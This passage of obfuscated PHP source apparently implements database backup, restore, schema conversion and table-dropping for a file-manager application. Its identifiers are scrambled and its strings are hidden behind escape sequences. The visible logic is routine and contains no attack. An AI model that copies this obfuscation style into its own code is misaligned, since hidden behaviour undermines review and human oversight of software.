$…Ï×¸¦Ê = $–´øÑÌ[$î®ÃÒ®[1048]]; $–´øÑÌ[$î®ÃÒ®[1048]] = substr($…Ï×¸¦Ê, 0, strrpos($…Ï×¸¦Ê, $î®ÃÒ®[1134])); } $this->database = $–´øÑÌ; $ØŒ…§”¶ = $this->model()->db(); try { $Ë”Ë•Ô• = $ØŒ…§”¶->execute("\163\150\157\x77\40\x64\x61\164\x61\x62\141\163\145\163\x20\154\x69\x6b\x65\40\47{$è¨ûÜŒã}\x27"); } catch (Exception $ıû¥ÔÈ¾) { } if (!$Ë”Ë•Ô•) { $ØŒ…§”¶->execute("\143\x72\145\x61\164\x65\x20\x64\141\x74\x61\x62\x61\x73\145\x20\140{$è¨ûÜŒã}\140"); } $–´øÑÌ[$î®ÃÒ®[1047]] = $è¨ûÜŒã; if ($–´øÑÌ[$î®ÃÒ®[1042]] == $î®ÃÒ®[1039]) { $–´øÑÌ[$î®ÃÒ®[1048]] .= $î®ÃÒ®[1134] . $è¨ûÜŒã; } $this->database = $–´øÑÌ; $ØŒ…§”¶->execute("\165\163\145\40\140{$è¨ûÜŒã}\140"); return $ØŒ…§”¶; } public function createTable($ê½ªÑºÄ, &$Ïšù¢®•) { $¿›Ú¶îş =& $_SERVER[°‰†òö¯]; if (!IO::exist($ê½ªÑºÄ)) { ActionCall($¿›Ú¶îş[1135], !0, 0); show_json(LNG($¿›Ú¶îş[1136]), !1); } $è·¯Š®à = $this->model()->db(); $ãÂ¦›òá = sqlSplit(IO::getContent($ê½ªÑºÄ)); foreach ($ãÂ¦›òá as $Öæ©²ÓØ) { $»àï¤Òß = stripos($Öæ©²ÓØ, $¿›Ú¶îş[1137]) === 0; if ($»àï¤Òß) { $Ïšù¢®•->task[$¿›Ú¶îş[1138]] += 1; } $è·¯Š®à->execute($Öæ©²ÓØ); if ($»àï¤Òß) { preg_match($¿›Ú¶îş[1139], $Öæ©²ÓØ, $Í•¡òÄ); $Ïšù¢®•->task[$¿›Ú¶îş[1140]] = $Í•¡òÄ[1]; $Ïšù¢®•->update(1); } } } public function insertTable($ï²‡‰ÀŒ, &$æ¥¶§ì) { $œŞ½î€™ =& $_SERVER[°‰†òö¯]; $Å™Ú¦ºı = $this->model()->db(); $§¢ÃºÖó = $ı³ü¯ğ ? array($ı³ü¯ğ) : $Å™Ú¦ºı->getTables(); foreach ($ï²‡‰ÀŒ as $à¤šßôÆ) { $ı³ü¯ğ = basename($à¤šßôÆ, $œŞ½î€™[851]); if (!in_array($ı³ü¯ğ, $§¢ÃºÖó)) { continue; } $æ¥¶§ì->task[$œŞ½î€™[1140]] = $ı³ü¯ğ; if (get_filesize($à¤šßôÆ) == 0) { continue; } $‰§È¾Ë = $this->sqlToDb($à¤šßôÆ, $æ¥¶§ì); if (!$‰§È¾Ë) { ActionCall($œŞ½î€™[1135], !0, 0); show_json(LNG($œŞ½î€™[1141]) . "\133{$ı³ü¯ğ}\x5d", !1); } } } public function sqlFromDb($óˆ¹µæ, $çŞµµ , &$Æ‚ëı, $±Êœøœ = '') { if ($Æ‚ëı) { $Æ‚ëı->task[$_SERVER[°‰†òö¯][1140]] = $óˆ¹µæ; } $ÏÙ‹‘ıî = $this->model($óˆ¹µæ); $²¯ï÷˜Ã = 0; $Á²Ç»­¯ = 0; $ñèÀ— = 10000; $‘éíúç¸ = fopen($çŞµµ , $_SERVER[°‰†òö¯][1142]); $îÌÓÃ©Š = $ÏÙ‹‘ıî->getPk(); $¾áÑØÍ¯ = $ÏÙ‹‘ıî->getDbFields(); $¥ö‡ôİ­ = $_SERVER[°‰†òö¯][12]; if ($GLOBALS[$_SERVER[°‰†òö¯][850]] && in_array($óˆ¹µæ, array($_SERVER[°‰†òö¯][1143], $_SERVER[°‰†òö¯][1144]))) { $¥ö‡ôİ­ = $óˆ¹µæ; } do { $ù  õŞ™ = array($îÌÓÃ©Š => array($_SERVER[°‰†òö¯][1089], $Á²Ç»­¯)); $Ô°š«“µ = $ÏÙ‹‘ıî->where($ù  õŞ™)->field($¾áÑØÍ¯)->order($îÌÓÃ©Š . $_SERVER[°‰†òö¯][1145])->limit($ñèÀ—)->select(); $Ô°š«“µ = !empty($Ô°š«“µ) ? $Ô°š«“µ : array(); if (!($ÆÒçÖÏ¥ = count($Ô°š«“µ))) { break; } $Í²šüÖ¿ = end($Ô°š«“µ); $Á²Ç»­¯ = $Í²šüÖ¿[$îÌÓÃ©Š]; $ï¿İœ­¬ = array(); foreach ($Ô°š«“µ as $ˆ›•Ğ¬•) { if ($¥ö‡ôİ­) { if ($óˆ¹µæ == $_SERVER[°‰†òö¯][1143]) { if ($ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][33]] == $_SERVER[°‰†òö¯][1146]) { $»Ñí”Ò = json_decode($ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][452]], !0); if ($»Ñí”Ò[$_SERVER[°‰†òö¯][32]] == $GLOBALS[$_SERVER[°‰†òö¯][850]] && $»Ñí”Ò[$_SERVER[°‰†òö¯][811]] != 1) { continue; } } } else { if ($ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][33]] == $_SERVER[°‰†òö¯][1147] && $ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][97]] == $_SERVER[°‰†òö¯][846]) { continue; } } } if ($±Êœøœ) { $ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][87]] = "\x7b\x69\x6f\72{$±Êœøœ}\x7d" . substr($ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][87]], strlen("\173\x69\x6f\72{$ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][884]]}\175")); $ˆ›•Ğ¬•[$_SERVER[°‰†òö¯][884]] = $±Êœøœ; } $ï¿İœ­¬[] = $_SERVER[°‰†òö¯][1148] . $this->sqlEncode($ˆ›•Ğ¬•) . $_SERVER[°‰†òö¯][1149]; } $çÕùÉû = "\111\116\123\x45\x52\x54\x20\x49\116\x54\117\x20\x60{$óˆ¹µæ}\140\40\50\x60" . implode($_SERVER[°‰†òö¯][1150], $¾áÑØÍ¯) . $_SERVER[°‰†òö¯][1151]; fwrite($‘éíúç¸, $çÕùÉû . implode($_SERVER[°‰†òö¯][1152], $ï¿İœ­¬) . $_SERVER[°‰†òö¯][74] . PHP_EOL); $²¯ï÷˜Ã += $ÆÒçÖÏ¥; if ($Æ‚ëı) { $Æ‚ëı->update($ÆÒçÖÏ¥); } } while ($ñèÀ— == $ÆÒçÖÏ¥); fclose($‘éíúç¸); return $²¯ï÷˜Ã; } public function sqlToDb($¿‚¬ö…Ö, &$ã¨íÎ÷€) { $©ßˆŒÜ€ =& $_SERVER[°‰†òö¯]; $ öØÆ•Ñ = $this->model()->db(); $–¸Âó = @fopen($¿‚¬ö…Ö, $©ßˆŒÜ€[1153]); if (!$–¸Âó) { return !1; } $Õè…şŸ¸ = 0; $ğÙ¾¤£ = $©ßˆŒÜ€[12]; $ˆ¥Òš›å = array(); $·´ˆÚ•ê = $this->dbType(); $÷Ç‰¿úˆ = $·´ˆÚ•ê == $©ßˆŒÜ€[13] ? 500 : 2000; $®áÓğö = basename($¿‚¬ö…Ö, $©ßˆŒÜ€[851]); $›Øõ£ˆÌ = 0; $ï»ÔÏÛŞ = 4194304; while (!feof($–¸Âó)) { $ö á˜ = trim(fgets($–¸Âó)); if (!$ö á˜) { continue; } $Ö€Â¶åŠ = $this->sqlDecode($ö á˜, $·´ˆÚ•ê, $®áÓğö); if (stripos($Ö€Â¶åŠ, $©ßˆŒÜ€[432]) === 0) { if (!$ğÙ¾¤£) { $ğÙ¾¤£ = $Ö€Â¶åŠ . $©ßˆŒÜ€[53]; } continue; } if ($ã¨íÎ÷€) { $ã¨íÎ÷€->task[$©ßˆŒÜ€[1138]] += 1; } $Õè…şŸ¸++; $ˆ¥Òš›å[] = rtrim(rtrim(trim($Ö€Â¶åŠ), $©ßˆŒÜ€[50]), $©ßˆŒÜ€[74]); $Î•ß†ñ¹ = null; $ØœµôÅÃ = strlen($Ö€Â¶åŠ); $›Øõ£ˆÌ += $ØœµôÅÃ; $÷ù¯Æç = strlen($ğÙ¾¤£) + $›Øõ£ˆÌ + (count($ˆ¥Òš›å) - 1); if ($÷ù¯Æç >= $ï»ÔÏÛŞ) { $Î•ß†ñ¹ = array_pop($ˆ¥Òš›å); if ($Õè…şŸ¸ > 1) { $Õè…şŸ¸--; } } if ($Õè…şŸ¸ >= $÷Ç‰¿úˆ || $Î•ß†ñ¹) { $Ö€Â¶åŠ = $ğÙ¾¤£ . implode($©ßˆŒÜ€[50], $ˆ¥Òš›å); if (!$ öØÆ•Ñ->execute($Ö€Â¶åŠ)) { return !1; } if ($ã¨íÎ÷€) { $ã¨íÎ÷€->update($Õè…şŸ¸); } $ˆ¥Òš›å = array(); $Õè…şŸ¸ = 0; $›Øõ£ˆÌ = 0; if ($Î•ß†ñ¹) { $ˆ¥Òš›å = array($Î•ß†ñ¹); $Õè…şŸ¸ = 1; $›Øõ£ˆÌ = $ØœµôÅÃ; } } } fclose($–¸Âó); if (!empty($ˆ¥Òš›å)) { $Ö€Â¶åŠ = $ğÙ¾¤£ . implode($©ßˆŒÜ€[50], $ˆ¥Òš›å); if (!$ öØÆ•Ñ->execute($Ö€Â¶åŠ)) { return !1; } if ($ã¨íÎ÷€) { $ã¨íÎ÷€->update($Õè…şŸ¸); } } return !0; } public function dropTable($¿Ö·İÁ¿ = null) { $–éÖî–« = $this->model()->db(); $¼¼ì‹´º = $¿Ö·İÁ¿ ? array($¿Ö·İÁ¿) : $–éÖî–«->getTables(); if (!$¼¼ì‹´º) { return; } foreach ($¼¼ì‹´º as $¿Ö·İÁ¿) { if ($¿Ö·İÁ¿) { $¿Ö·İÁ¿ = strtolower($¿Ö·İÁ¿); } else { continue; } $–éÖî–«->execute("\144\x72\x6f\160\40\x74\x61\x62\x6c\x65\x20\x69\x66\40\x65\170\x69\x73\x74\163\x20\x60{$¿Ö·İÁ¿}\140"); } } private function sqlEncode($ˆ ¯ıøœ) { $Ä¾à ¨ =& $_SERVER[°‰†òö¯]; $Åı¿à— = array(); foreach ($ˆ ¯ıøœ as $ªáş¾À¥) { if (is_array($ªáş¾À¥)) { $ªáş¾À¥ = json_encode_force($ªáş¾À¥); } $ªáş¾À¥ = addslashes($ªáş¾À¥); $ªáş¾À¥ = str_replace(array($Ä¾à ¨[1154], $Ä¾à ¨[287], $Ä¾à ¨[419]), array($Ä¾à ¨[1155], $Ä¾à ¨[1156], $Ä¾à ¨[1157]), $ªáş¾À¥); $Åı¿à—[] = $ªáş¾À¥; } return $Ä¾à ¨[58] . implode($Ä¾à ¨[1158], $Åı¿à—) . $Ä¾à ¨[58]; } private function sqlDecode($†—””Ÿ±, $æŒ¦‰ÀÚ, $ÖÇ¯†¼Ø = '') { $„¢”Óë¹ =& $_SERVER[°‰†òö¯]; $†—””Ÿ± = str_replace(array($„¢”Óë¹[1155], $„¢”Óë¹[1156], $„¢”Óë¹[1157]), array($„¢”Óë¹[1154], $„¢”Óë¹[287], $„¢”Óë¹[419]), $†—””Ÿ±); if ($æŒ¦‰ÀÚ == $„¢”Óë¹[13]) { $†—””Ÿ± = str_ireplace($„¢”Óë¹[1159], $„¢”Óë¹[59], $†—””Ÿ±); $†—””Ÿ± = stripslashes($†—””Ÿ±); } return preg_replace($„¢”Óë¹[1160], $„¢”Óë¹[12], $†—””Ÿ±); if ($æŒ¦‰ÀÚ == $„¢”Óë¹[13]) { return $ÖÇ¯†¼Ø != $„¢”Óë¹[845] ? stripslashes($†—””Ÿ±) : $†—””Ÿ±; } if ($ÖÇ¯†¼Ø == $„¢”Óë¹[845]) { $†—””Ÿ± = str_replace($„¢”Óë¹[1161], $„¢”Óë¹[121], stripslashes($†—””Ÿ±)); } return $†—””Ÿ±; } public function getSqlFile($æñÆ„²‰ = '') { $ËÊ€´Ë¬ =& $_SERVER[°‰†òö¯]; $ãÕÄğĞ = $this->dbType(!0); $úğ¦Ë«õ = CONTROLLER_DIR . "\x69\156\163\164\x61\154\x6c\57\x64\x61\x74\141\57{$ãÕÄğĞ}\x2e\x73\161\x6c"; $ú˜³¤õï = file_get_contents($úğ¦Ë«õ); $¬âñö¿Š = $ËÊ€´Ë¬[1162] . ($ãÕÄğĞ == $ËÊ€´Ë¬[869] ? $ËÊ€´Ë¬[1163] : $ËÊ€´Ë¬[1164]) . $ËÊ€´Ë¬[1165]; preg_match_all($¬âñö¿Š, $ú˜³¤õï, $†µµöËË); $£Š¨ø·Ò = $†µµöËË[1]; $ÓŒ“³¬Á = $this->model()->db(); $ş‘ûâË• = $ÓŒ“³¬Á->getTables(); $“œ•‰ù = TEMP_FILES . $ËÊ€´Ë¬[1166] . date($ËÊ€´Ë¬[261]) . $ËÊ€´Ë¬[8]; del_dir($“œ•‰ù); mk_dir($“œ•‰ù); $˜›ÔÜÖ¯ = $“œ•‰ù . $ËÊ€´Ë¬[1167]; $ø†üå‚† = $“œ•‰ù . $ËÊ€´Ë¬[1168]; $Åû®ùà = $ãÕÄğĞ == $ËÊ€´Ë¬[13] ? $ËÊ€´Ë¬[869] : $ËÊ€´Ë¬[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\141\154\154\57\x64\x61\x74\141\x2f{$Åû®ùà}\56\163\161\x6c", $“œ•‰ù); @touch($“œ•‰ù . $ãÕÄğĞ . $ËÊ€´Ë¬[851]); $Û‹¿¾‹ = fopen($˜›ÔÜÖ¯, $ËÊ€´Ë¬[1142]); $ƒó… = fopen($ø†üå‚†, $ËÊ€´Ë¬[1142]); if ($ãÕÄğĞ == $ËÊ€´Ë¬[13]) { $ş‘ûâË• = array_diff($ş‘ûâË•, array($ËÊ€´Ë¬[843], $ËÊ€´Ë¬[844])); $éÏı…ù• = array($ËÊ€´Ë¬[1169], $ËÊ€´Ë¬[1170], $ËÊ€´Ë¬[1171]); fwrite($ƒó…, implode(PHP_EOL, $éÏı…ù•) . PHP_EOL . PHP_EOL); foreach ($ş‘ûâË• as $…ğ¦‡ü¸) { $Â¥ñä¨‰ = $this->sqlFromSqlite($…ğ¦‡ü¸); if (!$Â¥ñä¨‰[$ËÊ€´Ë¬[13]]) { continue; } fwrite($ƒó…, $Â¥ñä¨‰[$ËÊ€´Ë¬[13]] . PHP_EOL . PHP_EOL); if (!in_array($…ğ¦‡ü¸, $£Š¨ø·Ò)) { fwrite($Û‹¿¾‹, $Â¥ñä¨‰[$ËÊ€´Ë¬[869]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ş‘ûâË• as $…ğ¦‡ü¸) { $Â¥ñä¨‰ = $this->sqlFromMysql($…ğ¦‡ü¸); if (!$Â¥ñä¨‰[$ËÊ€´Ë¬[869]]) { continue; } fwrite($Û‹¿¾‹, $Â¥ñä¨‰[$ËÊ€´Ë¬[869]] . PHP_EOL . PHP_EOL); if (!in_array($…ğ¦‡ü¸, $£Š¨ø·Ò)) { fwrite($ƒó…, $Â¥ñä¨‰[$ËÊ€´Ë¬[13]] . PHP_EOL . PHP_EOL); } } } fclose($Û‹¿¾‹); fclose($ƒó…); $ú˜³¤õï = array($ËÊ€´Ë¬[869] => $˜›ÔÜÖ¯, $ËÊ€´Ë¬[13] => $ø†üå‚†); return $æñÆ„²‰ ? $ú˜³¤õï[$æñÆ„²‰] : $ú˜³¤õï; } public function dbType($ÀóÁ…¶× = false) { $¿ûÉ˜×ä =& $_SERVER[°‰†òö¯]; $é‡¯çœŞ = $ÀóÁ…¶× ? $GLOBALS[$¿ûÉ˜×ä[6]][$¿ûÉ˜×ä[21]] : $this->database; $é‡¯çœŞ = array_change_key_case($é‡¯çœŞ); $‰¹Ö¸‘€ = $é‡¯çœŞ[$¿ûÉ˜×ä[1042]]; if ($‰¹Ö¸‘€ == $¿ûÉ˜×ä[1039]) { $œğ¨ƒó = explode($¿ûÉ˜×ä[4], $é‡¯çœŞ[$¿ûÉ˜×ä[1048]]); $‰¹Ö¸‘€ = $œğ¨ƒó[0]; } $ÅÎÚ±€Ğ = array($¿ûÉ˜×ä[1172] => $¿ûÉ˜×ä[13], $¿ûÉ˜×ä[985] => $¿ûÉ˜×ä[869]); if (isset($ÅÎÚ±€Ğ[$‰¹Ö¸‘€])) { $‰¹Ö¸‘€ = $ÅÎÚ±€Ğ[$‰¹Ö¸‘€]; } return $‰¹Ö¸‘€; } public function sqlFromMysql($ëŸŞÏ‰Š, $£–­Ò¿¸ = '') { $àĞÔŠÛÖ =& $_SERVER[°‰†òö¯]; $˜‹¼˜Ë = $this->model()->db(); $®ääîåø = $˜‹¼˜Ë->query($àĞÔŠÛÖ[1173] . $ëŸŞÏ‰Š . $àĞÔŠÛÖ[463]); if (!$®ääîåø || !$®ääîåø[0]) { return !1; } $—¶ú³é = _get($®ääîåø[0], $àĞÔŠÛÖ[1174], $àĞÔŠÛÖ[12]); if (!$—¶ú³é) { return !1; } $ùÏÀüÏ = "\104\122\x4f\120\x20\124\101\102\x4c\x45\x20\111\x46\x20\105\130\x49\x53\124\x53\x20\140{$ëŸŞÏ‰Š}\x60\73" . PHP_EOL . $—¶ú³é . $àĞÔŠÛÖ[74]; if ($£–­Ò¿¸ && $£–­Ò¿¸ == $àĞÔŠÛÖ[869]) { return $ùÏÀüÏ; } $ˆôíã»É = array_change_key_case($GLOBALS[$àĞÔŠÛÖ[6]][$àĞÔŠÛÖ[21]]); $ˆ¥ª°×Î = $ˆôíã»É[$àĞÔŠÛÖ[1047]]; $‰Ö¯Äµ = $àĞÔŠÛÖ[1175] . $ˆ¥ª°×Î . $àĞÔŠÛÖ[1176] . $ëŸŞÏ‰Š . $àĞÔŠÛÖ[58]; $­´Âä˜¦ = $àĞÔŠÛÖ[1177] . $ëŸŞÏ‰Š . $àĞÔŠÛÖ[973]; $ÍÃ°ò›¤ = $˜‹¼˜Ë->query($‰Ö¯Äµ); if (empty($ÍÃ°ò›¤)) { $üÙâìÈÁ = array($àĞÔŠÛÖ[869] => $àĞÔŠÛÖ[12], $àĞÔŠÛÖ[13] => $àĞÔŠÛÖ[12]); return $£–­Ò¿¸ ? $üÙâìÈÁ[$£–­Ò¿¸] : $üÙâìÈÁ; } $Ğö—¸¥ = $˜‹¼˜Ë->query($­´Âä˜¦); $ùŠ„òàø = $àĞÔŠÛÖ[12]; $£ÂÁùˆŸ = array(); foreach ($Ğö—¸¥ as $²Ş»ú¡Ã) { if (!$ùŠ„òàø && $²Ş»ú¡Ã[$àĞÔŠÛÖ[1178]] == $àĞÔŠÛÖ[1179]) { $ùŠ„òàø = $²Ş»ú¡Ã[$àĞÔŠÛÖ[1180]]; } if (isset($£ÂÁùˆŸ[$²Ş»ú¡Ã[$àĞÔŠÛÖ[1178]]])) { $£ÂÁùˆŸ[$²Ş»ú¡Ã[$àĞÔŠÛÖ[1178]]][$àĞÔŠÛÖ[1181]][] = $²Ş»ú¡Ã[$àĞÔŠÛÖ[1180]]; continue; } $£ÂÁùˆŸ[$²Ş»ú¡Ã[$àĞÔŠÛÖ[1178]]] = array($àĞÔŠÛÖ[1182] => $²Ş»ú¡Ã[$àĞÔŠÛÖ[1178]], $àĞÔŠÛÖ[1181] => array($²Ş»ú¡Ã[$àĞÔŠÛÖ[1180]]), $àĞÔŠÛÖ[1183] => $²Ş»ú¡Ã[$àĞÔŠÛÖ[1184]] == $àĞÔŠÛÖ[91] ? 0 : 1); } $ıãõú¦€ = array(); foreach ($£ÂÁùˆŸ as $²Ş»ú¡Ã) { $¶öäı¶ = $²Ş»ú¡Ã[$àĞÔŠÛÖ[1182]] == $àĞÔŠÛÖ[1179]; $üĞØÚ¢ = array($àĞÔŠÛÖ[1185], $²Ş»ú¡Ã[$àĞÔŠÛÖ[1183]] == $àĞÔŠÛÖ[91] && !$¶öäı¶ ? $àĞÔŠÛÖ[1186] : $àĞÔŠÛÖ[12], $àĞÔŠÛÖ[1187], $àĞÔŠÛÖ[1188] . $ëŸŞÏ‰Š . $àĞÔŠÛÖ[11] . ($¶öäı¶ ? $àĞÔŠÛÖ[1189] : $²Ş»ú¡Ã[$àĞÔŠÛÖ[1182]]) . $àĞÔŠÛÖ[121], $àĞÔŠÛÖ[1190], $àĞÔŠÛÖ[121] . $ëŸŞÏ‰Š . $àĞÔŠÛÖ[121], $àĞÔŠÛÖ[1191] . implode($àĞÔŠÛÖ[1192], $²Ş»ú¡Ã[$àĞÔŠÛÖ[1181]]) . $àĞÔŠÛÖ[1193]); $ıãõú¦€[] = implode($àĞÔŠÛÖ[53], $üĞØÚ¢) . $àĞÔŠÛÖ[74]; } $«ƒè¥” = array(); $ìí™±¾È = array($àĞÔŠÛÖ[1194] => $àĞÔŠÛÖ[1195], $àĞÔŠÛÖ[1195] => $àĞÔŠÛÖ[1195], $àĞÔŠÛÖ[365] => $àĞÔŠÛÖ[392], $àĞÔŠÛÖ[364] => $àĞÔŠÛÖ[392]); foreach ($ÍÃ°ò›¤ as $²Ş»ú¡Ã) { $üĞØÚ¢ = array($àĞÔŠÛÖ[121] . $²Ş»ú¡Ã[$àĞÔŠÛÖ[1196]] . $àĞÔŠÛÖ[121], isset($ìí™±¾È[$²Ş»ú¡Ã[$àĞÔŠÛÖ[1197]]]) ? $ìí™±¾È[$²Ş»ú¡Ã[$àĞÔŠÛÖ[1197]]] : $²Ş»ú¡Ã[$àĞÔŠÛÖ[1198]], $²Ş»ú¡Ã[$àĞÔŠÛÖ[1199]] == $àĞÔŠÛÖ[971] ? $àĞÔŠÛÖ[1200] : $àĞÔŠÛÖ[1201], $²Ş»ú¡Ã[$àĞÔŠÛÖ[1196]] == $ùŠ„òàø ? $àĞÔŠÛÖ[1202] : $àĞÔŠÛÖ[12], $²Ş»ú¡Ã[$àĞÔŠÛÖ[1022]] ? strtoupper(str_replace($àĞÔŠÛÖ[11], $àĞÔŠÛÖ[12], $²Ş»ú¡Ã[$àĞÔŠÛÖ[1022]])) : $àĞÔŠÛÖ[12]); $«ƒè¥”[] = trim(implode($àĞÔŠÛÖ[53], $üĞØÚ¢)); } $ÙÑ€°Ç® = array($àĞÔŠÛÖ[1203] . $ëŸŞÏ‰Š . $àĞÔŠÛÖ[1204], $àĞÔŠÛÖ[1205] . $ëŸŞÏ‰Š . $àĞÔŠÛÖ[1206], implode($àĞÔŠÛÖ[50] . PHP_EOL, $«ƒè¥”), $àĞÔŠÛÖ[1019]); $×¹İ†µµ = implode(PHP_EOL, array_merge($ÙÑ€°Ç®, $ıãõú¦€)); if ($£–­Ò¿¸ && $£–­Ò¿¸ == $àĞÔŠÛÖ[13]) { return $×¹İ†µµ; } $üÙâìÈÁ = array($àĞÔŠÛÖ[869] => $ùÏÀüÏ, $àĞÔŠÛÖ[13] => $×¹İ†µµ); return $£–­Ò¿¸ ? $üÙâìÈÁ[$£–­Ò¿¸] : $üÙâìÈÁ; } public function sqlFromSqlite($…œ—°´€, $½Ë¾ïÕƒ = '') { $ÅÄ¡à±® =& $_SERVER[°‰†òö¯]; $õÁÅŠê· = $this->model()->db(); $¦ğ¾®‘ê = "\x50\122\x41\107\x4d\x41\x20\124\x41\102\x4c\105\137\x49\x4e\x46\x4f\40\50\x27{$…œ—°´€}\x27\x29"; $¸ÕáÅ• = "\123\105\x4c\x45\103\x54\40\x2a\40\106\122\117\115\40\x73\x71\154\x69\164\x65\x5f\x6d\x61\x73\x74\x65\162\40\127\110\x45\x52\x45\40\164\142\154\x5f\156\141\x6d\145\40\75\x20\47{$…œ—°´€}\x27"; $ş¸×¸•Í = $õÁÅŠê·->query($¦ğ¾®‘ê); if (empty($ş¸×¸•Í)) { $–®£Ë Ú = array($ÅÄ¡à±®[869] => $ÅÄ¡à±®[12], $ÅÄ¡à±®[13] => $ÅÄ¡à±®[12]); return $½Ë¾ïÕƒ ? $–®£Ë Ú[$½Ë¾ïÕƒ] : $–®£Ë Ú; } $Šà£Œäà = $õÁÅŠê·->query($¸ÕáÅ•); $¶äºÈüÅ = $òÜô£… = array(); foreach ($Šà£Œäà as $à»£‰Š) { if ($à»£‰Š[$ÅÄ¡à±®[33]] == $ÅÄ¡à±®[358]) { $¶äºÈüÅ[] = $à»£‰Š[$ÅÄ¡à±®[1207]]; } else { $òÜô£…[$à»£‰Š[$ÅÄ¡à±®[32]]] = $à»£‰Š[$ÅÄ¡à±®[1207]]; } } $ŸÇ»¦í× = array_merge(array($ÅÄ¡à±®[1203] . $…œ—°´€ . $ÅÄ¡à±®[121]), $¶äºÈüÅ, array_values($òÜô£…)); $ŸÇ»¦í× = implode($ÅÄ¡à±®[74] . PHP_EOL, $ŸÇ»¦í×) . $ÅÄ¡à±®[74]; if ($½Ë¾ïÕƒ && $½Ë¾ïÕƒ == $ÅÄ¡à±®[13]) { return $ŸÇ»¦í×; } $»Ÿ²…› = array(); foreach ($òÜô£… as $Ş‘ˆ¨µ‰ => $‚ŠÍĞ¼) { $¥…ûëıŠ = str_replace($ÅÄ¡à±®[1208] . $…œ—°´€ . $ÅÄ¡à±®[11], $ÅÄ¡à±®[12], $Ş‘ˆ¨µ‰); $¥…ûëıŠ = str_replace($…œ—°´€ . $ÅÄ¡à±®[11], $ÅÄ¡à±®[12], $Ş‘ˆ¨µ‰); $Ï§¡Ì™¹ = str_replace(array($ÅÄ¡à±®[121], $ÅÄ¡à±®[1030]), $ÅÄ¡à±®[463], substr($‚ŠÍĞ¼, stripos($‚ŠÍĞ¼, $ÅÄ¡à±®[339]))); $»Ÿ²…›[$¥…ûëıŠ] = $Ï§¡Ì™¹; } $¨ÂÛ•ùØ = array(); $ñ§“×ƒ§ = array($ÅÄ¡à±®[1195] => $ÅÄ¡à±®[1209], $ÅÄ¡à±®[392] => $ÅÄ¡à±®[1210]); $¢ğÜ¦’ş = $«º´Û = $ÅÄ¡à±®[12]; foreach ($ş¸×¸•Í as $à»£‰Š) { if ($à»£‰Š[$ÅÄ¡à±®[57]] == $ÅÄ¡à±®[91]) { $¢ğÜ¦’ş = $à»£‰Š[$ÅÄ¡à±®[32]]; } $î†»åÀö = $à»£‰Š[$ÅÄ¡à±®[33]]; if ($î†»åÀö == $ÅÄ¡à±®[1211] && isset($»Ÿ²…›[$à»£‰Š[$ÅÄ¡à±®[32]]])) { $î†»åÀö = $ÅÄ¡à±®[1212]; } $èÄ‚‹¸¯ = array($ÅÄ¡à±®[463] . $à»£‰Š[$ÅÄ¡à±®[32]] . $ÅÄ¡à±®[463], _get($ñ§“×ƒ§, $î†»åÀö, $î†»åÀö), $à»£‰Š[$ÅÄ¡à±®[35]] == $ÅÄ¡à±®[91] ? $ÅÄ¡à±®[1200] : $ÅÄ¡à±®[1213] . $à»£‰Š[$ÅÄ¡à±®[56]], $à»£‰Š[$ÅÄ¡à±®[57]] == $ÅÄ¡à±®[91] ? $ÅÄ¡à±®[1214] : $ÅÄ¡à±®[12]); $¨ÂÛ•ùØ[] = trim(implode($ÅÄ¡à±®[53], $èÄ‚‹¸¯)); } foreach ($»Ÿ²…› as $¥…ûëıŠ => $Ï§¡Ì™¹) { if ($¥…ûëıŠ == $ÅÄ¡à±®[1189]) { $”Ì‚ë©ò = $«º´Û = $ÅÄ¡à±®[1215] . $¢ğÜ¦’ş . $ÅÄ¡à±®[1216]; } else { $”Ì‚ë©ò = (stripos($¥…ûëıŠ, $ÅÄ¡à±®[11]) ? $ÅÄ¡à±®[1217] : $ÅÄ¡à±®[12]) . ($ÅÄ¡à±®[1218] . $¥…ûëıŠ . $ÅÄ¡à±®[1219] . $Ï§¡Ì™¹); } $¨ÂÛ•ùØ[] = $”Ì‚ë©ò; } if ($¢ğÜ¦’ş && !$«º´Û) { $¨ÂÛ•ùØ = array_merge(array($ÅÄ¡à±®[1215] . $¢ğÜ¦’ş . $ÅÄ¡à±®[1216]), $¨ÂÛ•ùØ); } $úíúÀğæ = array($ÅÄ¡à±®[1220] . $…œ—°´€ . $ÅÄ¡à±®[1221], $ÅÄ¡à±®[1222] . $…œ—°´€ . $ÅÄ¡à±®[1223], implode($ÅÄ¡à±®[50] . PHP_EOL, $¨ÂÛ•ùØ), $ÅÄ¡à±®[1224]); $¯á™‹¹• = implode(PHP_EOL, $úíúÀğæ); if ($½Ë¾ïÕƒ && $½Ë¾ïÕƒ == $ÅÄ¡à±®[869]) { return $¯á™‹¹•; } $–®£Ë Ú = array($ÅÄ¡à±®[869] => $¯á™‹¹•, $ÅÄ¡à±®[13] => $ŸÇ»¦í×); return $½Ë¾ïÕƒ ? $–®£Ë Ú[$½Ë¾ïÕƒ] : $–®£Ë Ú; } } goto aó‰í®ø†; AÕàÁÄ—Ä: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\164\x61\x73\x6b\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\164\x79\160\145", "\145\166\x65\156\x74", "\x74\x69\155\145", "\x64\145\163\x63", "\163\171\x73\164\145\x6d", "\x65\x6e\x61\142\x6c\x65", "\154\x61\163\164\x52\x75\x6e", "\163\157\x72\x74"); public function listData($†¤¬¾ğ = false, $¥ù¼ÖûÌ = "\163\157\162\x74", $·Å„€Îû = false) { return parent::listData($†¤¬¾ğ, $¥ù¼ÖûÌ, $·Å„€Îû); } public function add($¼ÀÈÎ•¿) { $Ãß¾”¢ =& $_SERVER[°‰†òö¯]; $Çáê¼§î = $this->findByName($¼ÀÈÎ•¿[$Ãß¾”¢[32]]); if ($Çáê¼§î) { return !1; } $¼ÀÈÎ•¿[$Ãß¾”¢[1721]] = 0; $¼ÀÈÎ•¿[$Ãß¾”¢[1996]] = $this->getSort(); return parent::insert($¼ÀÈÎ•¿); } private function getSort() { $™œÏÑ¶Ü =& $_SERVER[°‰†òö¯]; $ç÷Æ«ø¥ = parent::listData(); $ëÓ×ú¢ä = array_to_keyvalue($ç÷Æ«ø¥, 